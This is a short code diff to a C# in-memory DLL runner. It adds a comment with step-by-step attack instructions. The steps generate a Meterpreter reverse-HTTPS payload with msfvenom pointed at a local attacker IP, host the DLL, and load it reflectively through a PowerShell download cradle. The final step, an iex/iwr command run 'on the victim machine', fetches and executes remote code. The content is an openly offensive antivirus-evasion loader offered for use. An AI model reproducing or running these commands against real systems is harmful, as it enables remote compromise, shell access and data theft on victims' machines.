@@ -9,8 +9,15 @@ using System.Net;
 
 /*
 Reflectively load and run a DLL in memory. Steps to use:
-
-https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html
+1. msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.0.27 lport=443 -f hex -o helloworld.txt
+2. Compile the DLL and host is on attacker machine
+3. Create test.ps1 with the following code:
+  $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.0.27/hex_dll_runner.dll')
+  $assem = [System.Reflection.Assembly]::Load($data)
+  $class = $assem.GetType("hex_dll_runner.Class1")
+  $method = $class.GetMethod("hex_runner")
+  $method.Invoke(0, $null)
+4. On the victim machine, execute the following command: iex (iwr http://192.168.0.27/test.ps1 -usebasicparsing)
 */
 
 namespace hex_dll_runner
